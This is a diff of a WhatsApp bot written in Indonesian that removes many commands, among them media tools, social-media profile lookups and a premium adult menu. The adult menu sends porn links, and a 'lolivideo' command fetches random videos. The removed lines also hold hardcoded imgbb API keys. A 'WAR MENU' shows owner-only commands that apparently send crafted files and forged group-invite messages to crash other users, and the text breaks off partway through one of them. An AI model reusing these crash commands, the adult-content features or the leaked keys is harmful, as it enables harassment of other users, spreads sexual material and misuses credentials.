-ply2 =`Silahkan Pilih Media Di Bawah ini`
-but = [
-{ buttonId: `${prefix}mp3 ${args.join(" ")}`, buttonText: { displayText: '️ᴍᴜsɪᴋ 🎵' }, type: 1 },
-{ buttonId: `${prefix}mp4 ${args.join(" ")}`, buttonText: { displayText: 'ᴠɪᴅᴇᴏ 📽️' }, type: 1 }
-]
-sendButLocation(from, ply1, ply2, thmb, but)
-break
 case 'mp4':
 if (!isRegist) return freply(mess.regist)
 if (isBanned) return freply(mess.banned)
@@ -3934,87 +2119,6 @@ ini = await fetchJson(`https://api.zeks.me/api/ytplaymp3?apikey=apivinz&q=${args
 mp3 = await getBuffer(ini.result.url_audio)
 Ramdani.sendMessage(from, mp3, audio)
 break
-          case 'lirik':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-               if (!q) return freply(mess.wrongFormat)
-               freply(mess.wait)
-               lirikLagu(q).then((res) => {
-               let lirik = `Lirik Lagu ${q}
-
-               ${res[0].result}
-`
-               freply(lirik)
-})
-               break
-        case 'pinterest':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (args.length == 0) return freply(`Example: ${prefix + command} loli kawaii`)
-                    query = args.join(" ")
-                    ini_url = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/download/pinterest?q=${query}&apikey=${ramdaniapi}`)
-                    ini_url = ini_url.result
-                    ini_buffer = await getBuffer(ini_url)
-                    await Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek })
-                    break      
-        case 'shopee':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-               try {
-               if (args.length == 0) return freply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)
-               query = args.join(" ")
-               freply(mess.wait)
-               get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${zeksapi}&q=${query}`)
-               get_data = get_data.data
-               teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
-┆ *SHOPEE*
-└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶
-
-*Data Berhasil Didapatkan!*\n`
-for(let i = 0; i < get_data.length; i++) {
-teks += `\`\`\`• Nama : ${get_data[i].name}\`\`\`
-\`\`\`• Harga : ${get_data[i].harga}\`\`\`
-\`\`\`• Terjual : ${get_data[i].terjual}\`\`\`
-\`\`\`• Lokasi : ${get_data[i].location}\`\`\`
-\`\`\`• Deskripsi*: ${get_data[i].desc}\`\`\`
-\`\`\`• Stok : ${get_data[i].stock}\`\`\`
-\`\`\`• Informasi : ${get_data[i].information}\`\`\`
-\`\`\`• Link : ${get_data[i].url}\`\`\``
-}
-              ini_buffer = await getBuffer(get_data[0].img_detail[0])
-              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
-              } catch {
-              freply(`Maaf produk ${query} tidak ditemukan`)
-}
-              break
-       case 'playstore':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              try {
-              if (args.length == 0) return freply(`Kirim perintah *${prefix}playstore [ apk ]*\nContoh : ${prefix}playstore pubg`)
-              query = args.join(" ")
-              freply(mess.wait)
-              get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${zeksapi}&q=${query}`)
-              get_result = get_result.result
-              teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
-┆ *PLAYSTORE*
-└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶
-
-*Data Berhasil Didapatkan!*\n`
-for(let i = 0; i < get_result.length; i++) {
-teks += `\`\`\`• Title : ${get_result[i].title}\`\`\`
-\`\`\`• Harga : ${get_result[i].price}\`\`\`
-\`\`\`• Rate : ${get_result[i].rating}\`\`\`
-\`\`\`• Link : ${get_result[i].url}\`\`\`
-
-`
-}
-              ini_buffer = await getBuffer(get_result[0].thumb)
-              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
-              } catch {
-              freply(`Maaf aplikasi ${query} tidak ditemukan`)
-}
-              break
         case 'yts':
        case 'ytsearch':
               if (!isRegist) return freply(mess.regist)
@@ -4055,55 +2159,6 @@ a += `\`\`\`• Title : ${i.title}\`\`\`
                } else {
                freply('kirim/reply gambar/video')
 }
-               break
-       case 'imgtourl':
-       case 'img2url':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-               freply(mess.wait) 
-               var imgbb = require('imgbb-uploader')
-               var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-               var media = await  Ramdani.downloadAndSaveMediaMessage(encmedia)       
-               imgbb('39d895963468b814fad0514bd28787e2', media)
-              .then(data => {
-               var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
-               ibb = fs.readFileSync(media)
-               Ramdani.sendMessage(from, ibb, image, { quoted: mek, caption: caps})
-})
-              .catch(err => {
-               throw err
-})
-               break
-         case 'asupan':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-               freply(mess.wait)
-               asupan()
-              .then(async (body) => {
-               asupann = body.split('\n')
-               asupanx = asupann[Math.floor(Math.random() * asupann.length)]
-               sendMediaURL(from, `http://sansekai.my.id/ptl_repost/${asupanx}`, '\`\`\`ASUPAN BRO GUA DAPAT DARI RAMDANI OFFICIAL\`\`\`')
-               console.log('Success sending video!')
-})
-              .catch(async (err) => {
-               console.log(err)
-               freply(`${err}`)
-})
-               break              
-        case 'nulis':
-        case 'tulis':
-               if (!isRegist) return freply(mess.regist)
-               if (isBanned) return freply(mess.banned)
-               if (args.length < 1) return freply('Yang mau di tulis apaan?')
-               teks = args.join(' ')
-               freply(mess.wait)
-               nulis = encodeURIComponent(teks)
-               res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
-               if (res.data.error) return freply(res.data.error)
-               buff = Buffer.from(res.data.result.split(',')[1], 'base64')
-               Ramdani.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
-               return freply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
-})
                break
 //------------------< Level >-------------------
       case 'level': 
@@ -4186,126 +2241,8 @@ a += `\`\`\`• Title : ${i.title}\`\`\`
               freply('_Perlu setidaknya 10 user yang memiliki level di database!_')
 }
               break
-//------------------< Stalk >-------------------
-      case 'stalkgithub':
-      case 'githubstalk':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (args.length == 0) return freply(`Example: ${prefix + command} Ramdani-chan02`)
-              freply(mess.wait)
-              username = args[0]
-              ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${lolhumanapi}`)
-              ini_result = ini_result.result
-              ini_buffer = await getBuffer(ini_result.avatar)
-              ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
-┆ *GITHUB USER*
-└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶
-
-*Data Berhasil Didapatkan!*
-\`\`\`• Username : ${ini_result.name}\`\`\`
-\`\`\`• Public Repo : ${ini_result.public_repos}\`\`\`
-\`\`\`• Public Gists : ${ini_result.public_gists}\`\`\`
-\`\`\`• Pengikut : ${ini_result.followers}\`\`\`
-\`\`\`• Following : ${ini_result.following}\`\`\`
-\`\`\`• Mengikuti : ${ini_result.bio}\`\`\`
-\`\`\`• Link : ${ini_result.url}\`\`\`
-`
-             Ramdani.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
-             break
-      case 'stalkig':
-      case 'igstalk':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-             if (args.length == 0) return freply(`Example: ${prefix + command} Ramdani.chan26`)
-             freply(mess.wait)
-             username = args[0]
-             ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${lolhumanapi}`)
-             ini_result = ini_result.result
-             ini_buffer = await getBuffer(ini_result.photo_profile)
-             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
-┆ *INSTAGRAM PROFILE*
-└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶
-
-*Data Berhasil Didapatkan!*
-\`\`\`• Username : ${ini_result.username}\`\`\`
-\`\`\`• Nama : ${ini_result.fullname}\`\`\`
-\`\`\`• Pengikut : ${ini_result.followers}\`\`\`
-\`\`\`• Mengikuti : ${ini_result.following}\`\`\`
-\`\`\`• Deskripsi : ${ini_result.bio}\`\`\`
-\`\`\`• Link : https://instagram.com/${ini_result.username}\`\`\`
-`
-             Ramdani.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
-             break
-      case 'stalktiktok':
-      case 'tiktokstalk':
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-             if (args.length == 0) return freply(`Example: ${prefix + command} marz.hiatus`)
-             freply(mess.wait)
-             stalk_toktok = args[0]
-             get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=${lolhumanapi}`)
-             get_result = get_result.result
-             pp_tt = await getBuffer(get_result.user_picture)
-             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
-┆ *TIKTOK PROFILE*
-└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶
-
-*Data Berhasil Didapatkan!*
-\`\`\`• Username : ${get_result.username}\`\`\`
-\`\`\`• Nama : ${get_result.nickname}\`\`\`
-\`\`\`• Pengikut : ${get_result.followers}\`\`\`
-\`\`\`• Mengikuti : ${get_result.followings}\`\`\`
-\`\`\`• Likes : ${get_result.likes}\`\`\`
-\`\`\`• Video : ${get_result.video}\`\`\`
-\`\`\`• Deskripsi : ${get_result.bio}\`\`\`
-`
-              Ramdani.sendMessage(from, pp_tt, image, { quoted: mek, caption: ini_txt, thumbnail: Buffer.alloc(0) })
-              break
-       case 'iguser':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              try {
-              if (args.length == 0) return freply(`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`)
-              query = args.join(" ")
-              freply(mess.wait)
-              get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=${zeksapi}&q=${query}`)
-              get_result = get_result.result
-              teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
-              for(let i = 0; i < get_result.length; i++) {
-              teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
-}
-              ini_buffer = await getBuffer(get_result[0].profile_pic)
-              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
-              } catch {
-              freply(`Maaf username ${query} tidak ditemukan`)
-}
-              break
-        
-case 'ffstalk':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-if (args.length == 0) return freply(`Idnya mana kak?`)
-                    ff_id = args[0]
-                    get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/freefire/${ff_id}?apikey=genbotkey`)
-                    freply(`nih kak`)
-                    break      
 //------------------< media/sticker/Tools >-------------------
 
-       case 'dadu':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              freply(mess.wait)
-              dadu()
-             .then(async (body) => {
-              dadugerak = body.split('\n')
-              dadugerakx = dadugerak[Math.floor(Math.random() * dadugerak.length)]
-              sendWebp(from, dadugerakx)
-})
-             .catch(async (err) => {
-              console.error(err)
-              freply('Error!')
-})
-              break              
       case 'doge':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
@@ -4359,89 +2296,6 @@ if (args.length == 0) return freply(`Idnya mana kak?`)
               sendWebp(from, pjrr)
 }
 )
-              break
-       case 'telesticker': 
-       case 'telestiker':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!q) return freply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
-              freply(mess.wait)
-              ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${lolhumanapi}&url=${args[0]}`)
-              ini_sticker = ini_url.result.sticker
-              freply('Sending '+ ini_sticker.length +' stickers...')
-              for (sticker_ in ini_sticker) {
-              ini_buffer = await getBuffer(ini_sticker[sticker_])
-              Ramdani.sendMessage(from, ini_buffer, sticker, {})
-}
-              break
-       case 'semoji':
-       case 'emoji':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (args.length == 0) return freply(`Example: ${prefix + command} ðŸ˜­`)
-              emoji = args[0]
-              try {
-              emoji = encodeURI(emoji[0])
-              } catch {
-              emoji = encodeURI(emoji)
- }
-              ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${lolhumanapi}`)
-              await Ramdani.sendMessage(from, ini_buffer, sticker, { quoted: mek })
-              break
-case 'ttp2':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
-woy = args.join(" ")
-freply('wait....')
-anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
-sendStickerUrl(from, anjay)
-break
-case 'ttp':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (args.length == 0) return freply(`Example: ${prefix + command} Ramdani Official`)
-              woy = args.join(" ")
-              freply(mess.wait)
-              buffer = await getBuffer(`http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`)
-              Ramdani.sendMessage(from, buffer, sticker, { quoted: mek })
-              break
-       case 'attp':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (args.length == 0) return freply(`Example: ${prefix + command} Ramdani Official`)
-              freply(mess.wait)
-              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
-              Ramdani.sendMessage(from, buffer, sticker, { quoted: mek })
-              break
-       case 'ttg':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!q) return await freply(mess.wrongFormat)
-              freply(mess.wait)
-              sendWebp(from, `https://api.vhtear.com/textxgif?text=${q}&apikey=${vhtearapi}`)
-             .then(() => console.log('Success creating GIF!'))
-             .catch(async (err) => {
-              console.error(err)
-              freply('Error!')
-})
-              break
-       case 'loliv':
-       case 'lolivid':
-       case 'lolivideo':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              freply(mess.wait)
-              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
-             .then(async (body) => {
-              anu = body.split('\n')
-              anu = anu[Math.floor(Math.random() * anu.length)]
-              sendMediaURL(from, anu)
-})
-             .catch(async (err) => {
-              console.error(err)
-              freply(`${err}`)
-})
               break
        case 'gifstiker':
 				case 's':
@@ -4502,93 +2356,6 @@ case 'ttp':
                 freply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
             }
             break    
-       case 'take':
-       case 'colong':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!isQuotedSticker) return freply('Stiker aja om')
-              encmedia = JSON.parse(JSON.strngify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-              media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
-              anu = args.join(' ').split('|')
-              satu = anu[0] !== '' ? anu[0] : `${pushname}`
-              dua = typeof anu[1] !== 'undefined' ? anu[1] : `UwU`
-              require('./lib/fetch.js').createExif(satu, dua)
-              require('./lib/fetch.js').modStick(media, Ramdani, mek, from)
-              break
-       case 'delwm':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!isQuotedSticker) return freply('Stiker aja om')
-              encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-              media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
-              anu = args.join(' ').split('|')
-              satu = anu[0] !== '' ? anu[0] : ``
-              dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
-              require('./lib/fetch.js').createExif(satu, dua)
-              require('./lib/fetch.js').modStick(media, Ramdani, mek, from)
-              break
-       case 'stikerwm':
-       case 'stickerwm':
-       case 'swm':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              var a = arg.split("|")[0];
-              var b = arg.split("|")[1];
-              if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
-              const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-              media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
-              await createExif(a,b)
-              out = getRandom('.webp')
-              ffmpeg(media)
-             .on('error', (e) => {
-              console.log(e)
-              Ramdani.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
-              fs.unlinkSync(media)
-})
-             .on('end', () => {
-            _out = getRandom('.webp')
-              spawn('webpmux', ['-set','exif','./media/sticker/data.exif', out, '-o', _out])
-             .on('exit', () => {
-              Ramdani.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
-              fs.unlinkSync(out)
-              fs.unlinkSync(_out)
-              fs.unlinkSync(media)
-})
-})
-             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
-             .toFormat('webp')
-             .save(out) 
-              } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
-              const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-              const media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
-              pe = args.join('')
-              var a = pe.split("|")[0];
-              var b = pe.split("|")[1];
-              await createExif(a,b)
-              out = getRandom('.webp')
-              ffmpeg(media)
-             .on('error', (e) => {
-              console.log(e)
-              Ramdani.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
-              fs.unlinkSync(media)
-})
-             .on('end', () => {
-            _out = getRandom('.webp')
-              spawn('webpmux', ['-set','exif','./media/sticker/data.exif', out, '-o', _out])
-             .on('exit', () => {
-              Ramdani.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
-              fs.unlinkSync(out)
-              fs.unlinkSync(_out)
-              fs.unlinkSync(media)
-})
-})
-             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
-             .toFormat('webp')
-             .save(out)       
-              } else {
-              freply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
-}
-              break
       case 'toimg':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
@@ -4605,163 +2372,6 @@ case 'ttp':
               fs.unlinkSync(ran)
 })
               break
-              case 'smeme': 
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-freply('Loading.... ')
-top = arg.split('|')[0]
-bottom = arg.split('|')[1]
-var imgbb = require('imgbb-uploader')
-if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
-ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
-owgi = await  Ramdani.downloadAndSaveMediaMessage(ger)
-anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
-teks = `${anu.display_url}`
-ranp = getRandom('.gif')
-rano = getRandom('.webp')
-anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
-sendStickerUrl(from, `${anu1}`)
-} else {
-freply('Gunakan foto/stiker!')
-}
-break
-
-       case 'memeimg':
-       case 'memegen':                    
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              top = arg.split('|')[0]
-              bottom = arg.split('|')[1]
-              var imgbb = require('imgbb-uploader')
-              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
-              freply(mess.wait)
-              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
-              owgi = await Ramdani.downloadAndSaveMediaMessage(ger)
-              anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
-              teks = `${anu.display_url}`
-              ranp = getRandom('.gif')
-              rano = getRandom('.webp')
-              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
-              sendMediaURL(from, `${anu1}`, mess.success)
-              } else {
-              freply('Gunakan foto/stiker!')
-}
-               break
-        case 'togif':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
-               freply(mess.wait)
-               encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-               mediaaa = await Ramdani.downloadAndSaveMediaMessage(encmediaaa)
-               a = await webp2gifFile(mediaaa)
-               mp4 = await getBuffer(a.result)
-               Ramdani.sendMessage(from, mp4, video, {mimetype: 'video/gif', quoted: mek, caption: mess.success})
-               fs.unlinkSync(mediaaa)
-               } else {
-               freply(mess.wrongFormat)
-}
-               break
-        case 'tovideo':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
-               freply(mess.wait)
-               encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-               mediaaa = await Ramdani.downloadAndSaveMediaMessage(encmediaaa)
-               a = await webp2gifFile(mediaaa)
-               mp4 = await getBuffer(a.result)
-               Ramdani.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: mek, caption: mess.success})
-               fs.unlinkSync(mediaaa)
-               } else {
-               freply(mess.wrongFormat)
-}
-               break
-        case 'tomp3':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-               if (isQuotedVideo || isQuotedAudio){
-               freply(mess.wait)
-               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-               media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
-               ran = getRandom('.mp3')
-               exec(`ffmpeg -i ${media} ${ran}`, (err) => {
-               fs.unlinkSync(media)
-               if (err) return freply(`Err: ${err}`)
-               buffer453 = fs.readFileSync(ran)
-               Ramdani.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
-               fs.unlinkSync(ran)
-})
-               } else {
-               freply(mess.wrongFormat)
-}
-               break      
-//------------------<18+ Menu>-----------------------   
-       case 'randombokep':
-              if (!isRegist) return freply(mess.regist)
-              if (isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-              if (!isPremium) return freply(mess.premium)
-              bokep = body.slice(1)
-              const bo =['https://www.mediafire.com/download/8hnhjcf3pseubgy','https://www.mediafire.com/download/cty9phda3d1s62u','https://www.mediafire.com/download/8hnhjcf3pseubgy']
-              const kep = bo[Math.floor(Math.random() * bo.length)]
-              Ramdani.sendMessage(from, '*PERMINTAAN:* '+bokep+'\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* '+ kep, text, { quoted: ftoko, caption: `NI BOKEP SAYA DAPAT DARI *© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ* DOSA TANGGUNG SENDIRI🗿`})
-              break
-                case 'xnxx':
-              if (!isRegist) return freply(mess.regist)
-              if (isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-              if (!isPremium) return freply(mess.premium)
-                    if (args.length == 0) return freply(`Contoh: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
-                    query = args.join(" ")
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxx?apikey=genbotkey&url=${query}`)
-                    get_result = get_result.result
-                    ini_txt = `Title : ${get_result.title}\n`
-                    ini_txt += `Duration : ${get_result.duration}\n`
-                    ini_txt += `View : ${get_result.view}\n`
-                    ini_txt += `Rating : ${get_result.rating}\n`
-                    ini_txt += `Like : ${get_result.like}\n`
-                    ini_txt += `Dislike : ${get_result.dislike}\n`
-                    ini_txt += `Comment : ${get_result.comment}\n`
-                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
-                    ini_txt += `Description : ${get_result.description}\n`
-                    ini_txt += "Link : \n"
-                    ini_link = get_result.link
-                    for (var x of ini_link) {
-                        ini_txt += `${x.type} - ${x.link}\n\n`
-                    }
-                    thumbnail = await getBuffer(get_result.thumbnail)
-                    Ramdani.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
-                    break
-case 'xnxxsearch':
-              if (!isRegist) return freply(mess.regist)
-              if (isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-              if (!isPremum) return freply(mess.premium)
-              if (args.length == 0) return freply(`Example: ${prefix + command} Japanese`)
-                    query = args.join(" ")
-                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=genbotkey&query=${query}`)
-                    get_result = get_result.result
-                    ini_txt = ""
-                    for (var x of get_result) {
-                        ini_txt += `Title : ${x.title}\n`
-                        ini_txt += `Views : ${x.views}\n`
-                        ini_txt += `Duration : ${x.duration}\n`
-                        ini_txt += `Uploader : ${x.uploader}\n`
-                        ini_txt += `Link : ${x.link}\n`
-                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
-                    }
-                    freply(ini_txt)
-                    break
-case 'bokep':
-case '4everproxy':
-case 'vpn':
-if (!isRegist) return freply(mess.regist)
-if (!isDewasa) return freply(mess.dewasa)
-if (isBanned) return freply(mess.banned)
-if (!isPremium) return freply(mess.premium)
-freply(`*TOBAT TOLOL, BOKEP MULU PIKIRAN LU,*`)
-break
 //KODE MENU
 case 'kodebahasa':                  
 if (!isRegist) return freply(mess.regist)
@@ -4770,182 +2380,7 @@ freply(`id = Indonesia
 en = English
 jp = Japan`)
 break 
-                    case 'kodenegara':
-                    if (!isRegist) return freply(mess.regist)
-                    if (isBanned) return freply(mess.banned)
-                    negara = args.join(' ')
-                    texxt = args.join(' ')
-					Ramdani.sendMessage(from, negara(), texxt)
-					break
-                    case 'tts':
-                    if (!isRegist) return freply(mess.regist)
-                    if (isBanned) return freply(mess.banned)
-				    if (args.length < 1) return Ramdani.sendMessage(from, 'Diperlukan kode bahasa kak!!', text, {quoted: mek})
-					const gtts = require('./lib/gtts')(args[0])
-					if (args.length < 2) return Ramdani.sendMessage(from, 'Mana teks yang mau di jadiin suara? suara setan kah?', text, {quoted: mek})
-					dtt = body.slice(8)
-					ranm = getRandom('.mp3')
-					rano = getRandom('.ogg')
-					dtt.length > 500
-					? freply('Textnya kebanyakan cok')
-					: gtts.save(ranm, dtt, function() {
-						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
-							fs.unlinkSync(ranm)
-							buffer = fs.readFileSync(rano)
-							if (err) return freply(ind.stikga())
-							Ramdani.sendMessage(from, buffer, audio, {quoted: mek, ptt:true})
-							fs.unlinkSync(rano)
-						})
-					})
-					break
 //------------------<WAR MENU>---------------    
- case 'pvp':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (!mek.key.fromMe && !isOwner) return
-tapib1 = fs.readFileSync('./media/audio/numayei.mp3')
-Ramdani.sendMessage(from, tapib1, document, { quoted: mek, filename:`Ramdani Official ~ 404 ${danz}.mp3`, mimetype: 'audio/application' })
-await freply('Bang mau nanya')
-break  
-case 'pgp':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (!isOwner && !mek.key.fromMe) return
-buf = Mfake
-imeu = await Ramdani.prepareMessage('0@s.whatsapp.net', buf, image) 
-imeg = imeu.message.imageMessage
-res = await Ramdani.prepareMessageFromContent(from,{
-"groupInviteMessage": {
-"groupJid": "6289512545999-1328272333@g.us",
-"inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": "162533333338378",
-"groupName": `Ramdani Official ~ 404 ${danz}`,
